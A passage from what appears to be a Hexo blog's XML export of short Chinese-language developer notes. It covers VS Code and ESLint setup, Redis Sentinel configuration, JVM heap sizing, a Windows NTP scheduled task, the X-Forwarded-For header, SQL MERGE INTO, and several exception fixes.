<p>9.2 查詢資料庫：完成設定資料庫 –&gt; 下命令 Oracle: Develop New Query –&gt; 即可查詢</p>
<p>10.<span class="exturl" data-url="aHR0cHM6Ly9tYXJrZXRwbGFjZS52aXN1YWxzdHVkaW8uY29tL2l0ZW1zP2l0ZW1OYW1lPWNodWNram9uYXMuYXBleC1wbWQ=">安裝 Apex PMD<i class="fa fa-external-link-alt"></i></span></p>
<p>11.HotKey</p>
<p>11.1 <span class="exturl" data-url="aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2RhdmlkY2hlbjAyMTcvZGF2aWRjaGVuMDIxNy5naXRodWIuaW8vbWFzdGVyL2ltYWdlcy9rZXlib2FyZC1zaG9ydGN1dHMtbGludXgucGRm">keyboard-shortcuts-linux.pdf<i class="fa fa-external-link-alt"></i></span></p>
<p>11.2 <span class="exturl" data-url="aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2RhdmlkY2hlbjAyMTcvZGF2aWRjaGVuMDIxNy5naXRodWIuaW8vbWFzdGVyL2ltYWdlcy9rZXlib2FyZC1zaG9ydGN1dHMtbWFjb3MucGRm">keyboard-shortcuts-macos.pdf<i class="fa fa-external-link-alt"></i></span></p>
<p>11.3 <span class="exturl" data-url="aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2RhdmlkY2hlbjAyMTcvZGF2aWRjaGVuMDIxNy5naXRodWIuaW8vbWFzdGVyL2ltYWdlcy9rZXlib2FyZC1zaG9ydGN1dHMtd2luZG93cy5wZGY=">keyboard-shortcuts-windows.pdf<i class="fa fa-external-link-alt"></i></span></p>
<p>12.JSP Editor</p>
<p>12.1 <span class="exturl" data-url="aHR0cHM6Ly9tYXJrZXRwbGFjZS52aXN1YWxzdHVkaW8uY29tL2l0ZW1zP2l0ZW1OYW1lPXB0aG9yc3Nvbi52c2NvZGUtanNw">Java Server Pages (JSP)<i class="fa fa-external-link-alt"></i></span>  </p>
<p>已知缺點</p>
<p>JSP 支援薄弱<br>Java Resource Bundle 不支援</p>
<p>Reference:</p>
<p>官方文件:</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9jb2RlLnZpc3VhbHN0dWRpby5jb20vZG9jcy9qYXZhL2phdmEtdHV0b3JpYWw=">Writing Java with Visual Studio Code<i class="fa fa-external-link-alt"></i></span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9jb2RlLnZpc3VhbHN0dWRpby5jb20vZG9jcy9qYXZhL2phdmEtcHJvamVjdA==">Java Project Management in VS Code<i class="fa fa-external-link-alt"></i></span></p>
]]></content>
      <categories>
        <category>VisualStudioCode</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>JavaScript</tag>
        <tag>VisualStudioCode</tag>
      </tags>
  </entry>
  <entry>
    <title>VisualStudio 2019 Community 升級 VisualStudio 2019 Professional方法</title>
    <url>/posts/f7f27fdb/</url>
    <content><![CDATA[<h3 id="VisualStudio2019Community升級VisualStudio2019Professional方法"><a href="#VisualStudio2019Community升級VisualStudio2019Professional方法" class="headerlink" title="VisualStudio2019Community升級VisualStudio2019Professional方法"></a>VisualStudio2019Community升級VisualStudio2019Professional方法</h3><span id="more"></span>
<p>建議的作法是先安裝VisualStudio2019Professional版本並啟用金鑰後，確定Professional版本是可以使用的，再將Community版本刪除。</p>
]]></content>
      <categories>
        <category>VisualStudio2019</category>
      </categories>
      <tags>
        <tag>VisualStudio2019</tag>
      </tags>
  </entry>
  <entry>
    <title>VisualStudioCode Use Eslint For Airbnb</title>
    <url>/posts/c77d97c9/</url>
    <content><![CDATA[<h3 id="VisualStudioCode-Use-Eslint-For-Airbnb"><a href="#VisualStudioCode-Use-Eslint-For-Airbnb" class="headerlink" title="VisualStudioCode Use Eslint For Airbnb"></a>VisualStudioCode Use Eslint For Airbnb</h3><span id="more"></span>
<p>這篇介紹如何在Visual Studio Code IDE啟用Eslint功能。</p>
<h3 id="VisualStudioCode-install-Eslint-package"><a href="#VisualStudioCode-install-Eslint-package" class="headerlink" title="VisualStudioCode install Eslint package"></a>VisualStudioCode install Eslint package</h3><img data-src="https://raw.githubusercontent.com/davidchen0217/davidchen0217.github.io/master/images/VisualStudioCodeInstallEslint.png" width="50%" />

<h3 id="安裝步驟"><a href="#安裝步驟" class="headerlink" title="安裝步驟"></a>安裝步驟</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">1.npm init (全部按下一步) -&gt; 建立package.json</span><br><span class="line">2.切到專案root目錄下</span><br><span class="line">3.eslint --init (按照自己需求) -&gt; 建立 .eslintrc.js </span><br><span class="line">Option:</span><br><span class="line">4.How would you like to use ESLint?</span><br><span class="line">choose:To check syntax, find problems, and enforce code style.</span><br><span class="line">5.What <span class="built_in">type</span> of modules does your project use?</span><br><span class="line">choose:JavaScript modules (import/export)</span><br><span class="line">6.Which framework does your project use?</span><br><span class="line">choose:None of these</span><br><span class="line">7.Does your project use TypeScript?</span><br><span class="line">choose:No</span><br><span class="line">8.Where does your code run?</span><br><span class="line">choose:Browser</span><br><span class="line">9.How would you like to define a style <span class="keyword">for</span> your project?</span><br><span class="line">choose:Use a popular style guide</span><br><span class="line">10.Which style guide <span class="keyword">do</span> you want to follow?</span><br><span class="line">choose:Airbnb: https://github.com/airbnb/javascript</span><br><span class="line">11.What format <span class="keyword">do</span> you want your config file to be <span class="keyword">in</span>?</span><br><span class="line">choose:JavaScript</span><br><span class="line">12.Would you like to install them now with npm?</span><br><span class="line">choose:Yes</span><br></pre></td></tr></table></figure>

<h3 id="eslintrc-js"><a href="#eslintrc-js" class="headerlink" title=".eslintrc.js"></a>.eslintrc.js</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">module.exports = &#123;</span><br><span class="line">    <span class="built_in">env</span>: &#123;</span><br><span class="line">        browser: <span class="literal">true</span>,</span><br><span class="line">        es2020: <span class="literal">true</span></span><br><span class="line">    &#125;,</span><br><span class="line">    extends: [</span><br><span class="line">        <span class="string">&quot;airbnb-base&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    parserOptions: &#123;</span><br><span class="line">        ecmaVersion: 11,</span><br><span class="line">        sourceType: <span class="string">&quot;module&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    rules: &#123;</span><br><span class="line">        <span class="string">&quot;no-tabs&quot;</span>: [<span class="string">&quot;error&quot;</span>, &#123; allowIndentationTabs: <span class="literal">true</span> &#125;],</span><br><span class="line">        indent: [<span class="string">&quot;error&quot;</span>, <span class="string">&quot;tab&quot;</span>, &#123; SwitchCase: 1 &#125;],</span><br><span class="line">        <span class="string">&quot;comma-dangle&quot;</span>: [<span class="string">&quot;error&quot;</span>, <span class="string">&quot;never&quot;</span>],</span><br><span class="line">        <span class="string">&quot;no-plusplus&quot;</span>: [<span class="string">&quot;error&quot;</span>, &#123; allowForLoopAfterthoughts: <span class="literal">true</span> &#125;],</span><br><span class="line">        quotes: [<span class="string">&quot;error&quot;</span>, <span class="string">&quot;double&quot;</span>],</span><br><span class="line">        <span class="string">&quot;prefer-template&quot;</span>: [<span class="string">&quot;off&quot;</span>],</span><br><span class="line">        <span class="string">&quot;no-continue&quot;</span>: [<span class="string">&quot;off&quot;</span>],</span><br><span class="line">        <span class="string">&quot;max-len&quot;</span>: [<span class="string">&quot;off&quot;</span>],</span><br><span class="line">        <span class="string">&quot;import/extensions&quot;</span>: [<span class="string">&quot;error&quot;</span>,</span><br><span class="line">            <span class="string">&quot;ignorePackages&quot;</span>,</span><br><span class="line">            &#123;</span><br><span class="line">                js: <span class="string">&quot;always&quot;</span>,</span><br><span class="line">                jsx: <span class="string">&quot;never&quot;</span>,</span><br><span class="line">                ts: <span class="string">&quot;always&quot;</span>,</span><br><span class="line">                tsx: <span class="string">&quot;never&quot;</span></span><br><span class="line">            &#125;]</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>VisualStudioCode</category>
      </categories>
      <tags>
        <tag>Eslint</tag>
      </tags>
  </entry>
  <entry>
    <title>What Is RC Version</title>
    <url>/posts/f0965390/</url>
    <content><![CDATA[<h3 id="What-Is-RC-Version"><a href="#What-Is-RC-Version" class="headerlink" title="What Is RC Version"></a>What Is RC Version</h3><span id="more"></span>
<p>這篇介紹What Is RC Version。</p>
<h3 id="Intro-RC-Version"><a href="#Intro-RC-Version" class="headerlink" title="Intro RC Version"></a>Intro RC Version</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Release Candidate(RC)指可能成為最終產品的候選版本，如果未出現問題則可釋出成為正式版本。</span><br><span class="line">在此階段的產品通常包含所有功能、或接近完整，亦不會出現嚴重問題。</span><br><span class="line"></span><br><span class="line">多數Open <span class="built_in">source</span> library會推出兩個RC版本，最後的RC2則成為正式版本。</span><br><span class="line"></span><br><span class="line">閉源軟體較少公開使用，Microsoft在Windows 7上是使用RC命名。</span><br><span class="line"></span><br><span class="line">Apple把在這階段的產品稱為「Golden Master Candidate」（簡稱GM Candidate），</span><br><span class="line">而最後的GM即成為正式版本。iOS 自 14.2 開始亦採用 RC 稱呼處於此階段的版本狀態。</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Software</category>
      </categories>
      <tags>
        <tag>Software</tag>
      </tags>
  </entry>
  <entry>
    <title>What Is Redis Sentinel</title>
    <url>/posts/213f665/</url>
    <content><![CDATA[<h3 id="What-Is-Redis-Sentinel"><a href="#What-Is-Redis-Sentinel" class="headerlink" title="What Is Redis Sentinel?"></a>What Is Redis Sentinel?</h3><span id="more"></span>
<p>這篇介紹What Is Redis Sentinel?</p>
<h3 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">The master-slave database architecture helps increase the scalability </span><br><span class="line">and performance of your enterprise database, offloading computation to</span><br><span class="line">the slave nodes and creating backups. However, this architecture can</span><br><span class="line">result <span class="keyword">in</span> availability issues <span class="keyword">in</span> the event that the master node goes down,</span><br><span class="line">causing the slave nodes to lose connection.</span><br><span class="line"></span><br><span class="line">First released <span class="keyword">in</span> 2012, Redis Sentinel is a high-availability solution <span class="keyword">for</span> Redis.</span><br><span class="line">The Redis Sentinel platform performs several key <span class="built_in">functions</span> to ensure high availability</span><br><span class="line"><span class="keyword">for</span> your enterprise databases:</span><br><span class="line"></span><br><span class="line">Monitoring your Redis deployment, including master and slave instances</span><br><span class="line">Notifying you of important issues and changes <span class="keyword">in</span> the Redis environment</span><br><span class="line">Automatically handling failover events <span class="keyword">in</span> the <span class="keyword">case</span> that a master node is unavailable</span><br><span class="line">Helping clients find the address of the current master node</span><br></pre></td></tr></table></figure>

<h3 id="Sentinel-Init-Parameters-YAML"><a href="#Sentinel-Init-Parameters-YAML" class="headerlink" title="Sentinel Init Parameters YAML"></a>Sentinel Init Parameters YAML</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">sentinelServersConfig:</span><br><span class="line">  idleConnectionTimeout:10000</span><br><span class="line">  pingTimeout:1000</span><br><span class="line">  connectTimeout:10000</span><br><span class="line">  <span class="built_in">timeout</span>:3000</span><br><span class="line">  retryAttempts:3</span><br><span class="line">  retryInterval:1500</span><br><span class="line">  reconnectionTimeout:3000</span><br><span class="line">  failedAttempts:3</span><br><span class="line">  password:null</span><br><span class="line">  subscriptionsPerConnection:5</span><br><span class="line">  clientName:null</span><br><span class="line">  loadBalancer:!&lt;org.redisson.connection.balancer.RoundRobinLoadBalancer&gt;&#123;&#125;</span><br><span class="line">  slaveSubscriptionConnectionMinimumIdleSize:1</span><br><span class="line">  slaveSubscriptionConnectionPoolSize:50</span><br><span class="line">  slaveConnectionMinimumIdleSize:32</span><br><span class="line">  slaveConnectionPoolSize:64</span><br><span class="line">  masterConnectionMinimumIdleSize:32</span><br><span class="line">  masterConnectionPoolSize:64</span><br><span class="line">  readMode:<span class="string">&quot;SLAVE&quot;</span></span><br><span class="line">  sentinelAddresses:</span><br><span class="line">-<span class="string">&quot;redis://127.0.0.1:26379&quot;</span></span><br><span class="line">-<span class="string">&quot;redis://127.0.0.1:26389&quot;</span></span><br><span class="line">  masterName:<span class="string">&quot;mymaster&quot;</span></span><br><span class="line">  database:0</span><br><span class="line">threads:0</span><br><span class="line">nettyThreads:0</span><br><span class="line">codec:!&lt;org.redisson.codec.JsonJacksonCodec&gt;&#123;&#125;</span><br><span class="line"><span class="string">&quot;transportMode&quot;</span>:<span class="string">&quot;NIO&quot;</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Redisson</category>
      </categories>
      <tags>
        <tag>Redisson</tag>
        <tag>Redis</tag>
      </tags>
  </entry>
  <entry>
    <title>Why JVM Heap Do Not Set Over 32g RAM</title>
    <url>/posts/996f5a5a/</url>
    <content><![CDATA[<h3 id="Why-JVM-Heap-Do-Not-Set-Over-32g-RAM"><a href="#Why-JVM-Heap-Do-Not-Set-Over-32g-RAM" class="headerlink" title="Why JVM Heap Do Not Set Over 32g RAM"></a>Why JVM Heap Do Not Set Over 32g RAM</h3><span id="more"></span>
<p>這篇介紹Why JVM Heap Do Not Set Over 32g RAM。</p>
<h3 id="bytes-example"><a href="#bytes-example" class="headerlink" title="bytes example"></a>bytes example</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Object header:</span><br><span class="line">32位元: 8 bytes。</span><br><span class="line">64位元: 開啟UseCompressedOops，使用12 bytes，反之會使用16 bytes。</span><br><span class="line"></span><br><span class="line">Primitive:</span><br><span class="line">boolean 1</span><br><span class="line">byte 	1</span><br><span class="line">short	2</span><br><span class="line">char	2</span><br><span class="line">int		4</span><br><span class="line"><span class="built_in">float</span>	4</span><br><span class="line">long	8</span><br><span class="line">double	8</span><br><span class="line"></span><br><span class="line">Reference:</span><br><span class="line">32位元: 4 bytes。</span><br><span class="line">64位元: 開啟UseCompressedOops，使用4 bytes，反之會使用8 bytes。</span><br></pre></td></tr></table></figure>

<h3 id="32位元-versus-64位元"><a href="#32位元-versus-64位元" class="headerlink" title="32位元 versus 64位元"></a>32位元 versus 64位元</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">以同一個class來說</span><br><span class="line">example:</span><br><span class="line">class C &#123;</span><br><span class="line">	int x;</span><br><span class="line">	B y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">32位元: 16 bytes</span><br><span class="line">64位元: 32 bytes</span><br><span class="line"></span><br><span class="line">會發現64位元相較32位元會需要使用2倍的RAM，實際平均是1.5倍。</span><br></pre></td></tr></table></figure>

<h3 id="conclusion"><a href="#conclusion" class="headerlink" title="conclusion"></a>conclusion</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">當Heap使用超過32g RAM時，JVM會停止使用UseCompressedOops參數，</span><br><span class="line">改使用64位元的方式來運作，在64位元Heap使用40g會比不上開啟</span><br><span class="line">UseCompressedOops使用的30g Heap。</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>JVM</category>
      </categories>
      <tags>
        <tag>JVM</tag>
        <tag>Heap</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows10使用工作排程器當登入時執行NTP對時</title>
    <url>/posts/e3a141d/</url>
    <content><![CDATA[<h3 id="本篇介紹如何在Windows10中，使用工作排程器設定登入時執行NTP對時程式"><a href="#本篇介紹如何在Windows10中，使用工作排程器設定登入時執行NTP對時程式" class="headerlink" title="本篇介紹如何在Windows10中，使用工作排程器設定登入時執行NTP對時程式"></a>本篇介紹如何在Windows10中，使用工作排程器設定登入時執行NTP對時程式</h3><span id="more"></span>
<p>Step1:<span class="exturl" data-url="aHR0cDovL3d3dy5zdGR0aW1lLmdvdi50dy9jaGluZXNlL2hvbWUuYXNweA==">國家時間與頻率標準實驗室網站<i class="fa fa-external-link-alt"></i></span> 下載NTPClock<br>Step2:寫一支.bat檔，用工作排程器設定登入時執行.bat<br>.bat檔內容如下:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line">start C:\NTPClockeng.exe</span><br><span class="line"><span class="built_in">exit</span></span><br></pre></td></tr></table></figure>
<p>Step3:工作排程器設定(一般)<br><img data-src="https://raw.githubusercontent.com/davidchen0217/davidchen0217.github.io/master/images/工作排程器設定1.png" width="90%" /><br>Step4:工作排程器設定(觸發程序)<br><img data-src="https://raw.githubusercontent.com/davidchen0217/davidchen0217.github.io/master/images/工作排程器設定2.png" width="90%" /><br>Step5:工作排程器設定(動作)<br><img data-src="https://raw.githubusercontent.com/davidchen0217/davidchen0217.github.io/master/images/工作排程器設定3.png" width="90%" /></p>
]]></content>
      <categories>
        <category>Windows10</category>
      </categories>
      <tags>
        <tag>Windows10</tag>
        <tag>NTPClock</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows10 Use Ethernet WIFI together</title>
    <url>/posts/f127cb49/</url>
    <content><![CDATA[<h3 id="Windows10-Use-Ethernet-WIFI-together"><a href="#Windows10-Use-Ethernet-WIFI-together" class="headerlink" title="Windows10 Use Ethernet WIFI together"></a>Windows10 Use Ethernet WIFI together</h3><span id="more"></span>
<p>這篇介紹Windows10 Use Ethernet WIFI together。</p>
<h3 id="需求"><a href="#需求" class="headerlink" title="需求"></a>需求</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">windows10系統預設是乙太網路</span><br><span class="line">因有需求要同時有乙太網路跟無線網路同時連上，避免系統發生無網路的狀態。</span><br></pre></td></tr></table></figure>

<h3 id="解決方法"><a href="#解決方法" class="headerlink" title="解決方法"></a>解決方法</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">開始 -&gt; regedit -&gt; 以系統管理員身份執行</span><br><span class="line"></span><br><span class="line">[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\WcmSvc\Local]</span><br><span class="line"></span><br><span class="line">右鍵 -&gt; 新增 -&gt; DWORD (32位元) 值 -&gt; 輸入fMinimizeConnections</span><br><span class="line"></span><br><span class="line">重新開機設定生效</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Windows10</category>
      </categories>
      <tags>
        <tag>Network</tag>
        <tag>Ethernet</tag>
        <tag>WIFI</tag>
      </tags>
  </entry>
  <entry>
    <title>關於HTTP Headers X-Forwarded-For</title>
    <url>/posts/9fdaf555/</url>
    <content><![CDATA[<h3 id="關於HTTP-Headers-X-Forwarded-For"><a href="#關於HTTP-Headers-X-Forwarded-For" class="headerlink" title="關於HTTP Headers X-Forwarded-For"></a>關於HTTP Headers X-Forwarded-For</h3><span id="more"></span>
<p>X-Forwarded-For (XFF) 標頭是辨識用戶端透過 HTTP 代理或負載平衡 IP 位置來源的，<br>事實上的標準。如果流量是在伺服器與用戶端中間擷取，伺服器日誌就只會代理或負載平衡的 IP 位置。<br>如果要檢查用戶端的 IP 的原始來源，就會去檢查 X-Forwarded-For 請求標頭。</p>
<h3 id="語法"><a href="#語法" class="headerlink" title="語法"></a>語法</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">X-Forwarded-For: &lt;client&gt;, &lt;proxy1&gt;, &lt;proxy2&gt;</span><br><span class="line">---</span><br><span class="line">&lt;client&gt;</span><br><span class="line">用戶端的 IP 位置</span><br><span class="line">&lt;proxy1&gt;, &lt;proxy2&gt;</span><br><span class="line">如果請求用上了多個代理，則列出每個後續代理的 IP 地址。也就是說，最右邊的 IP 位置，是最新代理的 IP 位置；最左邊的 IP 位置，是用戶端原始來源的 IP 位置。</span><br></pre></td></tr></table></figure>

<h3 id="X-Forwarded-For-可能被Hijack"><a href="#X-Forwarded-For-可能被Hijack" class="headerlink" title="X-Forwarded-For 可能被Hijack??"></a>X-Forwarded-For 可能被Hijack??</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">HTTP headers 可透過工具修改X-Forwarded-For內的值來達到hijack進而產生資安議題。</span><br></pre></td></tr></table></figure>

<h3 id="解決方法"><a href="#解決方法" class="headerlink" title="解決方法"></a>解決方法</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">在CDN上設定一組私有headers欄位來記錄 &lt;client&gt;, &lt;proxy1&gt;, &lt;proxy2&gt;...等IP，並在CDN上</span><br><span class="line">將IP加密，Server端在使用解密的方式取得相關IP，來進行白名單驗證。</span><br><span class="line"></span><br><span class="line">因為在CDN上設定另一組看不到的私有headers欄位以及透過加密加強資安，讓用戶端難以進行</span><br><span class="line">Hijack。</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>HTTP</category>
      </categories>
      <tags>
        <tag>headers</tag>
        <tag>X-Forwarded-For</tag>
      </tags>
  </entry>
  <entry>
    <title>關於MERGE INTO</title>
    <url>/posts/81b55e7a/</url>
    <content><![CDATA[<h3 id="關於MERGE-INTO"><a href="#關於MERGE-INTO" class="headerlink" title="關於MERGE INTO"></a>關於MERGE INTO</h3><span id="more"></span>
<p>這篇介紹MERGE INTO使用情境與如何使用。</p>
<h3 id="使用情境"><a href="#使用情境" class="headerlink" title="使用情境"></a>使用情境</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">MERGE INTO 可以達成以下需求</span><br><span class="line">如果Key MATCHED，可做 UPDATE/DELETE</span><br><span class="line">如果Key MATCHED + Condition (AND field &lt;&gt; field)，可做 UPDATE/DELETE</span><br><span class="line">如果Key NOT MATCHED，可INSERT</span><br></pre></td></tr></table></figure>

<h3 id="How-to-use"><a href="#How-to-use" class="headerlink" title="How to use"></a>How to use</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">MERGE INTO <span class="comment">#tmp1</span></span><br><span class="line">   USING <span class="comment">#tmp2</span></span><br><span class="line">   ON <span class="comment">#tmp1.key1 = #tmp2.key1 //可以多組Key</span></span><br><span class="line">WHEN MATCHED THEN   </span><br><span class="line">    UPDATE SET <span class="comment">#tmp1.Name = #tmp2.Name ,#tmp1.Phone = #tmp2.Phone </span></span><br><span class="line">WHEN MATCHED AND <span class="comment">#tmp1.Name &lt;&gt; #tmp2.Name THEN  //MATCHED可以再加條件</span></span><br><span class="line">    UPDATE SET <span class="comment">#tmp1.Name = #tmp2.Name ,#tmp1.Phone = #tmp2.Phone </span></span><br><span class="line">WHEN MATCHED AND <span class="comment">#tmp1.Name=&#x27;&#x27; AND #tmp2.Name=&#x27;&#x27; THEN  //MATCHED可以再加條件</span></span><br><span class="line">    DELETE //DELETE只要這樣寫</span><br><span class="line">WHEN NOT MATCHED THEN</span><br><span class="line">    INSERT VALUES(<span class="comment">#tmp2.co1,#tmp2.col2,#tmp2.col3);</span></span><br><span class="line">	</span><br><span class="line">(1) <span class="comment">#tmp1:要被INSERT/UPDATE/DELETE的Table</span></span><br><span class="line">(2) <span class="comment">#tmp2:被參考的Table</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>SQL</category>
      </categories>
      <tags>
        <tag>MergeInto</tag>
      </tags>
  </entry>
  <entry>
    <title>cluster block exception</title>
    <url>/posts/9d851ed1/</url>
    <content><![CDATA[<h3 id="Intro-cluster-block-exception"><a href="#Intro-cluster-block-exception" class="headerlink" title="Intro cluster_block_exception"></a>Intro cluster_block_exception</h3><span id="more"></span>
<p>這篇介紹cluster_block_exception.</p>
<h3 id="Filebeat-Memo-Records"><a href="#Filebeat-Memo-Records" class="headerlink" title="Filebeat Memo Records"></a>Filebeat Memo Records</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">org.elasticsearch.ElasticsearchStatusException: Elasticsearch exception </span><br><span class="line">[<span class="built_in">type</span>=cluster_block_exception, blocked by: [FORBIDDEN/12/index read-only / allow delete (api)];]</span><br><span class="line"></span><br><span class="line">Suppressed: org.elasticsearch.client.ResponseException: </span><br><span class="line">method [POST], host [], URI [], status line [HTTP/1.1 403 Forbidden]</span><br><span class="line"></span><br><span class="line">使用Rest High Level Api時，出現以上Exception訊息。</span><br><span class="line">追查後原因是ElasticSearch的硬碟容量滿了，造成cluster_block_exception。</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>ElasticSearch</category>
      </categories>
      <tags>
        <tag>ElasticSearch</tag>
        <tag>Exception</tag>
      </tags>
  </entry>
  <entry>
    <title>How To Solve adsbygoogle Push Error</title>
    <url>/posts/b8db21b/</url>
    <content><![CDATA[<h3 id="How-To-Solve-adsbygoogle-Push-Error"><a href="#How-To-Solve-adsbygoogle-Push-Error" class="headerlink" title="How To Solve adsbygoogle Push Error"></a>How To Solve adsbygoogle Push Error</h3><span id="more"></span>
<p>這篇介紹How To Solve adsbygoogle.push() error: Only one AdSense head tag supported per page. The second tag is ignored.</p>
<h3 id="當Google-adsense廣告上去時，瀏覽器F12會出現Error-Message"><a href="#當Google-adsense廣告上去時，瀏覽器F12會出現Error-Message" class="headerlink" title="當Google adsense廣告上去時，瀏覽器F12會出現Error Message"></a>當Google adsense廣告上去時，瀏覽器F12會出現Error Message</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Error Message:</span><br><span class="line">adsbygoogle.push() error: Only one AdSense <span class="built_in">head</span> tag supported per page. The second tag is ignored.</span><br><span class="line"></span><br><span class="line">原因是</span><br><span class="line">&lt;script async src=<span class="string">&quot;https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-xxxxxxxxxxxxxxxxxx&quot;</span></span><br><span class="line">     crossorigin=<span class="string">&quot;anonymous&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">上方這句引用造成與<span class="built_in">head</span>的script偵測到重覆。</span><br></pre></td></tr></table></figure>

<h3 id="解決方法"><a href="#解決方法" class="headerlink" title="解決方法"></a>解決方法</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">若是Hexo 8 version，請將 <span class="built_in">source</span>/_date下的 .njk裡面的</span><br><span class="line">&lt;script async src=<span class="string">&quot;https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-xxxxxxxxxxxxxxxxxx&quot;</span></span><br><span class="line">     crossorigin=<span class="string">&quot;anonymous&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">都拿掉，保留head.njk的引用就好</span><br><span class="line">這樣就可以解決!</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>GoogleAdsense</category>
      </categories>
      <tags>
        <tag>GoogleAdsense</tag>
      </tags>
  </entry>
  <entry>
    <title>com fasterxml jackson core JsonParseException</title>
    <url>/posts/969c3b23/</url>
    <content><![CDATA[<h3 id="Intro-com-fasterxml-jackson-core-JsonParseException"><a href="#Intro-com-fasterxml-jackson-core-JsonParseException" class="headerlink" title="Intro com fasterxml jackson core JsonParseException"></a>Intro com fasterxml jackson core JsonParseException</h3><span id="more"></span>
<p>這篇介紹com fasterxml jackson core JsonParseException.</p>
<h3 id="完整錯誤訊息及發生情境"><a href="#完整錯誤訊息及發生情境" class="headerlink" title="完整錯誤訊息及發生情境"></a>完整錯誤訊息及發生情境</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">在一個Redis Queue將String資料poll，並轉成instance時會</span><br><span class="line">throw JsonParseException。</span><br><span class="line">詳細錯誤為com.fasterxml.jackson.core.JsonParseException: </span><br><span class="line">Illegal character ((CTRL-CHAR, code <span class="number">4</span>)): </span><br><span class="line">only regular white space (\r, \n, \t) is allowed between tokens</span><br><span class="line"></span><br><span class="line">原因是Redis的codec編碼</span><br><span class="line">codec: !&lt;org.redisson.codec.MarshallingCodec&gt; &#123;&#125;</span><br><span class="line">codec: !&lt;org.redisson.client.codec.StringCodec&gt; &#123;&#125;</span><br><span class="line">兩邊設定錯誤，造成parse時編碼有問題造成JsonParseException。</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>jackson</category>
      </categories>
      <tags>
        <tag>jackson</tag>
        <tag>JsonParseException</tag>
      </tags>
  </entry>
  <entry>
    <title>double vs. BigDecimal</title>
    <url>/posts/30b68413/</url>
    <content><![CDATA[<h2 id="double-vs-BigDecimal"><a href="#double-vs-BigDecimal" class="headerlink" title="double vs. BigDecimal"></a>double vs. BigDecimal</h2><span id="more"></span>
<p>這篇介紹double和BigDecimal兩者不同以及使用時機。</p>
<h2 id="double-基本型別"><a href="#double-基本型別" class="headerlink" title="double 基本型別:"></a>double 基本型別:</h2><p>double型別的主要設計目標是為了科學計算和工程計算。他們執行二進位制浮點運算，這是為了在廣域數值範圍上提供較為精確的快速近似計算而精心設計的。<br>然而，它們沒有提供完全精確的結果，所以不應該被用於要求精確結果的場合。但是，商業計算往往要求結果精確。<br>Double.MAX_VALUE : 1.7976931348623157E308</p>
<h2 id="BigDecimal-物件"><a href="#BigDecimal-物件" class="headerlink" title="BigDecimal 物件:"></a>BigDecimal 物件:</h2><p>1.比較大小用compareTo()<br>public static int compareTo(double v1, double v2) {<br>    return BigDecimalUtils.compareTo(getInstance(v1), new BigDecimal(Double.toString(v2)));<br>}<br>2.BigDecial是immutable的，就像String一樣，它的所有操作都會生成一個新的物件<br>3.不要用equals方法來比較BigDecimal物件，因為它的equals方法會比較scale，如果scale不一樣，它會返回false</p>
<h2 id="兩者比較"><a href="#兩者比較" class="headerlink" title="兩者比較:"></a>兩者比較:</h2><p>double是基本型別使用記憶體較少，BigDecimal是物件使用記憶體較多</p>
